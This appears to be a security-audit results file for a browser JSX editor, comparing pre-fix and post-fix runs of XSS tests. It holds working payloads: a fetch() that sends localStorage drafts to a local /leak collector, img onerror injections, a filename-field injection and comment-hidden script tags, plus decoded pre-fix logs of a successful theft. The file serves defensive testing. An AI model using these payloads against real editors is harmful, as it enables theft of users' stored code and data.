@@ -1,0 +1,422 @@
+{
+  "generatedAt": "2026-10-18T15:29:41.390Z",
+  "investigatorNote": "The provided test collector APPENDS across runs. This artifact separates (1) pre-fix evidence — verbatim collector log lines recorded BEFORE the mid-audit security fix commit — from (2) the current post-fix rerun result, against the same payloads.",
+  "fixTimeline": {
+    "fixCommit": "6ef35a1ff28693d980f94a685dfa2dc2291b4b81 2026-10-17T17:04:04+03:00 security: sandbox user-code execution; SRI + strict CSP; input bounding",
+    "fixCommitIso": "2026-10-17T17:04:04+03:00",
+    "preFix": {
+      "integrityAttributesInEditorHtml": 0,
+      "cspMetaInEditorHtml": false,
+      "sandboxIframeInEditorJs": false,
+      "newFunctionInTopOrigin": true
+    },
+    "postFix": {
+      "integrityAttributesInEditorHtml": 1,
+      "cspMetaInEditorHtml": true,
+      "sandboxIframeInEditorJs": true
+    }
+  },
+  "preFixEvidence": {
+    "sourceFile": "tests/results/before/collector-8943.log (append-only; provided by tests/lib/servers.mjs, unmodified)",
+    "verbatimLines": [
+      "{\"ts\":\"2026-10-16T16:52:26.434Z\",\"method\":\"GET\",\"path\":\"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D\",\"body\":\"\"}",
+      "{\"ts\":\"2026-10-16T16:56:05.206Z\",\"method\":\"GET\",\"path\":\"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D\",\"body\":\"\"}",
+      "{\"ts\":\"2026-10-17T13:15:28.813Z\",\"method\":\"GET\",\"path\":\"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D\",\"body\":\"\"}"
+    ],
+    "decodedPayloads": [
+      {
+        "ts": "2026-10-16T16:52:26.434Z",
+        "path": "/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D",
+        "decoded": "[\"jsxpress:__draft\",\"jsxpress:f_secret\",\"jsxpress:layout\",\"{\\\"name\\\":\\\"secret-thing.jsx\\\",\\\"code\\\":\\\"//A-private-code-SECRET123\\\",\\\"currentKey\\\":null}\"]"
+      },
+      {
+        "ts": "2026-10-16T16:56:05.206Z",
+        "path": "/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D",
+        "decoded": "[\"jsxpress:__draft\",\"jsxpress:f_secret\",\"jsxpress:layout\",\"{\\\"name\\\":\\\"secret-thing.jsx\\\",\\\"code\\\":\\\"//A-private-code-SECRET123\\\",\\\"currentKey\\\":null}\"]"
+      },
+      {
+        "ts": "2026-10-17T13:15:28.813Z",
+        "path": "/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D",
+        "decoded": "[\"jsxpress:__draft\",\"jsxpress:f_secret\",\"jsxpress:layout\",\"{\\\"name\\\":\\\"secret-thing.jsx\\\",\\\"code\\\":\\\"//A-private-code-SECRET123\\\",\\\"currentKey\\\":null}\"]"
+      }
+    ],
+    "successSignal": "PRE-FIX ATTACK SUCCEEDED: /leak?lib=… carries localStorage keys jsxpress:__draft, jsxpress:f_secret + the seeded draft JSON with secret-thing.jsx and //A-private-code-SECRET123.",
+    "allLinesPredateFixCommit": true
+  },
+  "postFixRun": {
+    "collectorFile": "tests/results/before/collector-8943.log",
+    "shareLinks": {
+      "leak": "http://127.0.0.1:8903/editor.html#code=eyJuIjoiaW5ub2NlbnQuanN4IiwiYyI6ImZldGNoKFwiaHR0cDovLzEyNy4wLjAuMTo4OTQzL2xlYWs/bGliPVwiK2VuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeShPYmplY3Qua2V5cyhsb2NhbFN0b3JhZ2UpLmNvbmNhdChbbG9jYWxTdG9yYWdlLmdldEl0ZW0oXCJqc3hwcmVzczpfX2RyYWZ0XCIpfHxcIlwiXSkpKSkgOyBmdW5jdGlvbiBBcHAoKXtyZXR1cm4gbnVsbH0ifQ==",
+      "sentinel": "http://127.0.0.1:8903/editor.html#code=eyJuIjoic2VudGluZWwuanN4IiwiYyI6IndpbmRvdy5fX3B3bmVkVG9wPXRydWU7IGZ1bmN0aW9uIEFwcCgpe3JldHVybiBudWxsfSJ9",
+      "alert": "http://127.0.0.1:8903/editor.html#code=eyJuIjoiaW5ub2NlbnQuanN4IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2Lz59IDxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT4ifQ==",
+      "alertBraced": "http://127.0.0.1:8903/editor.html#code=eyJuIjoiaW5ub2NlbnQuanN4IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2Lz59IDxpbWcgc3JjPXggb25lcnJvcj17YWxlcnQoMSl9PiJ9",
+      "filename": "http://127.0.0.1:8903/editor.html#code=eyJuIjoiPGltZyBzcmM9eCBvbmVycm9yPXdpbmRvdy5fX3B3bmVkVG9wPTE+IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2Pm9rPC9kaXY+fSJ9",
+      "commentJs": "http://127.0.0.1:8903/editor.html#code=eyJuIjoiY29tbWVudHMuanN4IiwiYyI6Ii8qIDxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4gKi8gZnVuY3Rpb24gQXBwKCl7cmV0dXJuIG51bGx9In0=",
+      "commentJsx": "http://127.0.0.1:8903/editor.html#code=eyJuIjoiY29tbWVudHMuanN4IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2PnsvKiA8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+ICovfSBoaTwvZGl2Pn0ifQ=="
+    },
+    "leakRequestsThisRun": [],
+    "leakDecoded": {
+      "raw": "",
+      "error": null
+    },
+    "pageStates": {
+      "seedBefore": {
+        "status": "running",
+        "filename": "untitled.jsx",
+        "codeHead": "// Welcome to JSX Press.\n// Define a component named App (or use 'export default') — it renders automatically.\n// Edit anything; preview updates after a brief p",
+        "previewLen": 153,
+        "previewHead": "<iframe class=\"preview-sandbox\" title=\"Rendered preview\" sandbox=\"allow-scripts\" data-ready-seen=\"0\" src=\"sandbox-wrap.html#n=1\" data-alive=\"1\"></iframe>",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      },
+      "storageAfterSeed": {
+        "jsxpress:__draft": "{\"name\":\"secret-thing.jsx\",\"code\":\"//A-private-code-SECRET123\",\"currentKey\":null}",
+        "jsxpress:f_secret": "{\"name\":\"secret-thing.jsx\",\"code\":\"//A-private-code-SECRET123\",\"createdAt\":1729000000000,\"updatedAt\":1729000000000}",
+        "jsxpress:layout": "preview"
+      },
+      "state01a": {
+        "status": "runtime error",
+        "filename": "innocent.jsx",
+        "codeHead": "fetch(\"http://127.0.0.1:8943/leak?lib=\"+encodeURIComponent(JSON.stringify(Object.keys(localStorage).concat([localStorage.getItem(\"jsxpress:__draft\")||\"\"])))) ; ",
+        "previewLen": 734,
+        "previewHead": "<pre style=\"margin:0;padding:24px;background:#fff5f3;color:#9a2520;font-family:ui-monospace,monospace;font-size:13px;line-height:1.55;white-space:pre-wrap;border-left:4px solid #ff6b54\"><strong style=\"display:block;margin-bottom:8px;font-family:Georgia,serif;font-size:16px;font-weight:400\">Runtime error</strong>Window.localStorage getter: Forbidden in a sandboxed document without the 'allow-same-o",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:__draft",
+          "jsxpress:f_secret",
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      },
+      "state01aSentinel": {
+        "status": "running",
+        "filename": "sentinel.jsx",
+        "codeHead": "window.__pwnedTop=true; function App(){return null}",
+        "previewLen": 153,
+        "previewHead": "<iframe class=\"preview-sandbox\" title=\"Rendered preview\" sandbox=\"allow-scripts\" data-ready-seen=\"0\" src=\"sandbox-wrap.html#n=1\" data-alive=\"1\"></iframe>",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:__draft",
+          "jsxpress:f_secret",
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      },
+      "state01b": {
+        "status": "compile error",
+        "filename": "innocent.jsx",
+        "codeHead": "function App(){return <div/>} <img src=x onerror=alert(1)>",
+        "previewLen": 525,
+        "previewHead": "<pre style=\"margin:0;padding:24px;background:#fff5f3;color:#9a2520;font-family:ui-monospace,monospace;font-size:13px;line-height:1.55;white-space:pre-wrap;border-left:4px solid #ff6b54\"><strong style=\"display:block;margin-bottom:8px;font-family:Georgia,serif;font-size:16px;font-weight:400\">Compile error</strong>unknown: JSX value should be either an expression or a quoted JSX text. (1:39)\n\n&gt; 1 ",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      },
+      "state01bBraced": {
+        "status": "compile error",
+        "filename": "innocent.jsx",
+        "codeHead": "function App(){return <div/>} <img src=x onerror={alert(1)}>",
+        "previewLen": 527,
+        "previewHead": "<pre style=\"margin:0;padding:24px;background:#fff5f3;color:#9a2520;font-family:ui-monospace,monospace;font-size:13px;line-height:1.55;white-space:pre-wrap;border-left:4px solid #ff6b54\"><strong style=\"display:block;margin-bottom:8px;font-family:Georgia,serif;font-size:16px;font-weight:400\">Compile error</strong>unknown: JSX value should be either an expression or a quoted JSX text. (1:39)\n\n&gt; 1 ",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      },
+      "state01c": {
+        "status": "running",
+        "filename": "<img src=x onerror=window.__pwnedTop=1>",
+        "codeHead": "function App(){return <div>ok</div>}",
+        "previewLen": 153,
+        "previewHead": "<iframe class=\"preview-sandbox\" title=\"Rendered preview\" sandbox=\"allow-scripts\" data-ready-seen=\"0\" src=\"sandbox-wrap.html#n=1\" data-alive=\"1\"></iframe>",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      },
+      "state01dJsComment": {
+        "status": "running",
+        "filename": "comments.jsx",
+        "codeHead": "/* <script>alert(1)</script> */ function App(){return null}",
+        "previewLen": 153,
+        "previewHead": "<iframe class=\"preview-sandbox\" title=\"Rendered preview\" sandbox=\"allow-scripts\" data-ready-seen=\"0\" src=\"sandbox-wrap.html#n=1\" data-alive=\"1\"></iframe>",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      },
+      "state01dJsxComment": {
+        "status": "running",
+        "filename": "comments.jsx",
+        "codeHead": "function App(){return <div>{/* <img src=x onerror=alert(1)> */} hi</div>}",
+        "previewLen": 153,
+        "previewHead": "<iframe class=\"preview-sandbox\" title=\"Rendered preview\" sandbox=\"allow-scripts\" data-ready-seen=\"0\" src=\"sandbox-wrap.html#n=1\" data-alive=\"1\"></iframe>",
+        "previewHasMounted": false,
+        "pwnedTop": false,
+        "alerts": [],
+        "thiefErrors": [],
+        "storageKeys": [
+          "jsxpress:layout"
+        ],
+        "tamperedBabel": false,
+        "tamperedReact": false,
+        "tamperedReactDOM": false
+      }
+    },
+    "theftLogs": {
+      "01a-fire": {
+        "name": "01a-fire",
+        "requests": [
+          "http://127.0.0.1:8903/editor.html",
+          "https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,700;1,9..144,500&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap",
+          "http://127.0.0.1:8903/assets/site.css",
+          "http://127.0.0.1:8903/assets/editor.css",
+          "http://127.0.0.1:8903/assets/editor-boot.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js",
+          "http://127.0.0.1:8903/assets/templates.js",
+          "http://127.0.0.1:8903/assets/editor.js",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/fraunces/v38/6NUs8FyLNQOQZAnv9ZwNjucMHVn85Ni7emAe9lKqZTnbB-gzTK0K1ChJdt9hFwpX9W37lm1_mv0iQg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "http://127.0.0.1:8903/sandbox-wrap.html",
+          "https://cdnjs.cloudflare.com/ajax/libs/react/18.3.1/umd/react.production.min.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.3.1/umd/react-dom.production.min.js",
+          "https://cdn.tailwindcss.com/",
+          "https://cdn.tailwindcss.com/3.4.17"
+        ],
+        "console": [
+          {
+            "type": "warning",
+            "text": "cdn.tailwindcss.com should not be used in production. To use Tailwind CSS in production, install it as a PostCSS plugin or use the Tailwind CLI: https://tailwindcss.com/docs/installation"
+          }
+        ],
+        "errors": [],
+        "cspViolations": [],
+        "dialogs": []
+      },
+      "01a-sentinel": {
+        "name": "01a-sentinel",
+        "requests": [
+          "http://127.0.0.1:8903/editor.html",
+          "https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,700;1,9..144,500&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap",
+          "http://127.0.0.1:8903/assets/site.css",
+          "http://127.0.0.1:8903/assets/editor.css",
+          "http://127.0.0.1:8903/assets/editor-boot.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js",
+          "http://127.0.0.1:8903/assets/templates.js",
+          "http://127.0.0.1:8903/assets/editor.js",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/fraunces/v38/6NUs8FyLNQOQZAnv9ZwNjucMHVn85Ni7emAe9lKqZTnbB-gzTK0K1ChJdt9hFwpX9W37lm1_mv0iQg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "http://127.0.0.1:8903/sandbox-wrap.html",
+          "https://cdnjs.cloudflare.com/ajax/libs/react/18.3.1/umd/react.production.min.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.3.1/umd/react-dom.production.min.js",
+          "https://cdn.tailwindcss.com/",
+          "https://cdn.tailwindcss.com/3.4.17"
+        ],
+        "console": [
+          {
+            "type": "warning",
+            "text": "cdn.tailwindcss.com should not be used in production. To use Tailwind CSS in production, install it as a PostCSS plugin or use the Tailwind CLI: https://tailwindcss.com/docs/installation"
+          }
+        ],
+        "errors": [],
+        "cspViolations": [],
+        "dialogs": []
+      },
+      "01b-alert-jsx-unbraced": {
+        "name": "01b-alert-jsx-unbraced",
+        "requests": [
+          "http://127.0.0.1:8903/editor.html",
+          "https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,700;1,9..144,500&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap",
+          "http://127.0.0.1:8903/assets/site.css",
+          "http://127.0.0.1:8903/assets/editor.css",
+          "http://127.0.0.1:8903/assets/editor-boot.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js",
+          "http://127.0.0.1:8903/assets/templates.js",
+          "http://127.0.0.1:8903/assets/editor.js",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/fraunces/v38/6NUs8FyLNQOQZAnv9ZwNjucMHVn85Ni7emAe9lKqZTnbB-gzTK0K1ChJdt9hFwpX9W37lm1_mv0iQg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2"
+        ],
+        "console": [],
+        "errors": [],
+        "cspViolations": [],
+        "dialogs": []
+      },
+      "01b-alert-jsx-braced": {
+        "name": "01b-alert-jsx-braced",
+        "requests": [
+          "http://127.0.0.1:8903/editor.html",
+          "https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,700;1,9..144,500&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap",
+          "http://127.0.0.1:8903/assets/site.css",
+          "http://127.0.0.1:8903/assets/editor.css",
+          "http://127.0.0.1:8903/assets/editor-boot.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js",
+          "http://127.0.0.1:8903/assets/templates.js",
+          "http://127.0.0.1:8903/assets/editor.js",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/fraunces/v38/6NUs8FyLNQOQZAnv9ZwNjucMHVn85Ni7emAe9lKqZTnbB-gzTK0K1ChJdt9hFwpX9W37lm1_mv0iQg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2"
+        ],
+        "console": [],
+        "errors": [],
+        "cspViolations": [],
+        "dialogs": []
+      },
+      "01c-filename": {
+        "name": "01c-filename",
+        "requests": [
+          "http://127.0.0.1:8903/editor.html",
+          "https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,700;1,9..144,500&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap",
+          "http://127.0.0.1:8903/assets/site.css",
+          "http://127.0.0.1:8903/assets/editor.css",
+          "http://127.0.0.1:8903/assets/editor-boot.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js",
+          "http://127.0.0.1:8903/assets/templates.js",
+          "http://127.0.0.1:8903/assets/editor.js",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/fraunces/v38/6NUs8FyLNQOQZAnv9ZwNjucMHVn85Ni7emAe9lKqZTnbB-gzTK0K1ChJdt9hFwpX9W37lm1_mv0iQg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "http://127.0.0.1:8903/sandbox-wrap.html",
+          "https://cdnjs.cloudflare.com/ajax/libs/react/18.3.1/umd/react.production.min.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.3.1/umd/react-dom.production.min.js",
+          "https://cdn.tailwindcss.com/",
+          "https://cdn.tailwindcss.com/3.4.17"
+        ],
+        "console": [
+          {
+            "type": "warning",
+            "text": "cdn.tailwindcss.com should not be used in production. To use Tailwind CSS in production, install it as a PostCSS plugin or use the Tailwind CLI: https://tailwindcss.com/docs/installation"
+          }
+        ],
+        "errors": [],
+        "cspViolations": [],
+        "dialogs": []
+      },
+      "01d-js-comment": {
+        "name": "01d-js-comment",
+        "requests": [
+          "http://127.0.0.1:8903/editor.html",
+          "https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,700;1,9..144,500&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap",
+          "http://127.0.0.1:8903/assets/site.css",
+          "http://127.0.0.1:8903/assets/editor.css",
+          "http://127.0.0.1:8903/assets/editor-boot.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js",
+          "http://127.0.0.1:8903/assets/templates.js",
+          "http://127.0.0.1:8903/assets/editor.js",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/fraunces/v38/6NUs8FyLNQOQZAnv9ZwNjucMHVn85Ni7emAe9lKqZTnbB-gzTK0K1ChJdt9hFwpX9W37lm1_mv0iQg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "http://127.0.0.1:8903/sandbox-wrap.html",
+          "https://cdnjs.cloudflare.com/ajax/libs/react/18.3.1/umd/react.production.min.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.3.1/umd/react-dom.production.min.js",
+          "https://cdn.tailwindcss.com/",
+          "https://cdn.tailwindcss.com/3.4.17"
+        ],
+        "console": [
+          {
+            "type": "warning",
+            "text": "cdn.tailwindcss.com should not be used in production. To use Tailwind CSS in production, install it as a PostCSS plugin or use the Tailwind CLI: https://tailwindcss.com/docs/installation"
+          }
+        ],
+        "errors": [],
+        "cspViolations": [],
+        "dialogs": []
+      },
+      "01d-jsx-comment": {
+        "name": "01d-jsx-comment",
+        "requests": [
+          "http://127.0.0.1:8903/editor.html",
+          "https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,700;1,9..144,500&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap",
+          "http://127.0.0.1:8903/assets/site.css",
+          "http://127.0.0.1:8903/assets/editor.css",
+          "http://127.0.0.1:8903/assets/editor-boot.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js",
+          "http://127.0.0.1:8903/assets/templates.js",
+          "http://127.0.0.1:8903/assets/editor.js",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "https://fonts.gstatic.com/s/fraunces/v38/6NUs8FyLNQOQZAnv9ZwNjucMHVn85Ni7emAe9lKqZTnbB-gzTK0K1ChJdt9hFwpX9W37lm1_mv0iQg.woff2",
+          "https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2",
+          "http://127.0.0.1:8903/sandbox-wrap.html",
+          "https://cdnjs.cloudflare.com/ajax/libs/react/18.3.1/umd/react.production.min.js",
+          "https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.3.1/umd/react-dom.production.min.js",
+          "https://cdn.tailwindcss.com/",
+          "https://cdn.tailwindcss.com/3.4.17"
+        ],
+        "console": [
+          {
+            "type": "warning",
+            "text": "cdn.tailwindcss.com should not be used in production. To use Tailwind CSS in production, install it as a PostCSS plugin or use the Tailwind CLI: https://tailwindcss.com/docs/installation"
+          }
+        ],
+        "errors": [],
+        "cspViolations": [],
+        "dialogs": []
+      }
+    },
+    "assertions": {
+      "leakRequestReceived": false,
+      "localStorageContentsStolen": false,
+      "localStorageKeyNamesLeaked": false,
+      "alertInvoked_01bBraced": false,
+      "alertLiteral_01bUnbraced": "compile error (Babel requires braced expressions; vector as written by the brief does not transpile)",
+      "topOriginExecution_01aSentinel": false,
+      "topOriginExecution_01bAlert": false,
+      "filenamePayloadInert_01c": true,
+      "commentPayloadsInert_01d": true,
+      "localStorageReadFromPayload": false
+    }
+  },
+  "nonFencedRequests": []
+}
